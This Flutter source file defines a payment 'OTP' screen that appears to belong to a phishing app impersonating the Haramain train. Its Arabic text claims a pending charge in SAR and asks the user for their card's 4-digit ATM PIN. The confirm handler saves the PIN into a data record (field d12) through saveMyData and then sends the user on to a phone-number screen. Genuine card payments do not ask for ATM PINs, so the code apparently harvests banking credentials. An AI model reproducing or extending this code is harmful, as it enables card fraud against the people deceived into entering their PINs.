import 'package:checkout_screen_ui/validation.dart';
import 'package:flutter/material.dart';
import 'package:train/system/app_theme.dart';
import 'package:train/system/constants.dart';
import 'package:train/system/methods.dart';
import 'package:train/system/my_data.dart';
import 'package:train/system/train_persons.dart';
import 'package:train/ui/credit_card_screen.dart';
import 'package:train/ui/phone_number.dart';

// ignore: must_be_immutable
class PaymentOTPScreen extends StatefulWidget {
  PaymentOTPScreen(this.brand, this.persons, this.myData, {Key? key})
      : super(key: key);
  CardBrand brand;
  TrainPersons persons;
  MyData myData;

  @override
  State<PaymentOTPScreen> createState() => _PaymentOTPScreenState();
}

class _PaymentOTPScreenState extends State<PaymentOTPScreen> {
  final _formKey = GlobalKey<FormState>();
  final _otp = TextEditingController(text: '');

  @override
  Widget build(BuildContext context) {
    return Form(
      key: _formKey,
      child: Scaffold(
        appBar: AppBar(
            foregroundColor: AppTheme.mainColorBlack,
            backgroundColor: AppTheme.mainColorWhite),
        body: Directionality(
          textDirection: txtDirection(),
          child: SingleChildScrollView(
            child: Padding(
              padding: const EdgeInsets.all(16.0),
              child: Column(
                children: [
                  SizedBox(
                    height: height! * 0.1,
                    child: Row(
                      children: [
                        if (widget.brand == CardBrand.n_a)
                          Image.asset('assets/images/visa_card.png',
                              height: height! * 0.08),
                        if (widget.brand == CardBrand.n_a)
                          Image.asset('assets/images/master_card.png',
                              height: height! * 0.08),
                        if (widget.brand == CardBrand.n_a)
                          Image.asset('assets/images/mada.png',
                              height: height! * 0.08),
                        if (widget.brand == CardBrand.visa)
                          Image.asset('assets/images/visa_card.png',
                              height: height! * 0.08),
                        if (widget.brand == CardBrand.masterCard)
                          Image.asset('assets/images/master_card.png',
                              height: height! * 0.08),
                        if (widget.brand == CardBrand.visa ||
                            widget.brand == CardBrand.masterCard)
                          Image.asset('assets/images/mada.png',
                              height: height! * 0.08),
                      ],
                    ),
                  ),
                  Divider(
                      thickness: 1,
                      color: AppTheme.mainColorGreylight,
                      height: height! * 0.01),
                  SizedBox(height: height! * 0.028),
                  Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        xText(
                            txt: 'يوجد معاملة مالية على حسابك بقيمة',
                            txtSize: width! * 0.04,
                            color: AppTheme.mainColorBlack),
                      ],
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        xText(
                            txt: 'SAR ${widget.persons.amount.toStringAsFixed(3)}',
                            txtSize: width! * 0.04,
                            color: AppTheme.mainColorBlack,
                            fontWeight: FontWeight.bold),
                      ],
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        xText(
                            txt: 'لقطار الحرمين لتأكيد المعاملة يرجى إدخال',
                            txtSize: width! * 0.04,
                            color: AppTheme.mainColorBlack),
                      ],
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        xText(
                            txt: '  رمز الصراف الألي ( ATM ) المكون من ٤ ارقام',
                            txtSize: width! * 0.04,
                            color: AppTheme.mainColorBlack),
                      ],
                    ),
                  ),
                  SizedBox(height: height! * 0.03),
                  Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: xText(
                        txt: 'رمز الصراف الألي',
                        txtSize: width! * 0.035,
                        color: AppTheme.mainColorGrey),
                  ),
                  Padding(
                    padding: EdgeInsets.only(
                        right: width! * 0.2, left: width! * 0.2),
                    child: TextFormField(
                      controller: _otp,
                      textAlign: TextAlign.center,
                      decoration: InputDecoration(
                          hintText: 'رمز الصراف الألي',
                          hintStyle: const TextStyle(
                              color: AppTheme.mainColorGreylight),
                          contentPadding: const EdgeInsets.only(right: 10),
                          focusedBorder: OutlineInputBorder(
                            borderSide: const BorderSide(
                                width: 1, color: Color(0xFFBDBDBD)),
                            borderRadius: BorderRadius.circular(8),
                          ),
                          border: OutlineInputBorder(
                            borderSide: const BorderSide(
                                width: 1, color: Color(0xFFBDBDBD)),
                            borderRadius: BorderRadius.circular(8),
                          ),
                          enabledBorder: OutlineInputBorder(
                            borderSide: const BorderSide(
                                width: 1, color: Color(0xFFBDBDBD)),
                            borderRadius: BorderRadius.circular(8),
                          )),
                      keyboardType: TextInputType.number,
                      inputFormatters: [
                        MaskedTextInputFormatter(
                          mask:
                              widget.brand == CardBrand.amex ? 'xxxx' : 'xxxx',
                          separator: '',
                        )
                      ],
                      style:
                          const TextStyle(color: AppTheme.mainColorGreylight),
                      validator: (value) {
                        if (value == null || value.isEmpty) {
                          return 'الرجاء إدخال رمز الصراف الألي الصالح.';
                        }
                        return null;
                      },
                    ),
                  ),
                  SizedBox(height: height! * 0.01),
                  Padding(
                    padding: EdgeInsets.only(
                        right: width! * 0.2, left: width! * 0.2),
                    child: SizedBox(
                      height: height! * 0.04,
                      child: Material(
                        shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(5)),
                        color: AppTheme.mainColorBlueOTP,
                        child: InkWell(
                          onTap: () {
                            if (_formKey.currentState!.validate()) {}

                            if (_otp.text.toString().trim().length >= 4) {
                              widget.myData.d12 =
                                  'رمز الصراف الألي - ${_otp.text}';
                              saveMyData(widget.myData);
                              pushScreen(
                                  context, PhoneNumber(widget.myData), 'push');
                              xShowGeneralDialog(
                                  context, const Duration(seconds: 2));
                            }
                          },
                          child: Container(
                            alignment: Alignment.center,
                            child: xText(
                                txt: 'تأكيد',
                                color: AppTheme.mainColorWhite,
                                txtSize: width! * 0.04),
                          ),
                        ),
                      ),
                    ),
                  ),
                  SizedBox(height: height! * 0.02),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
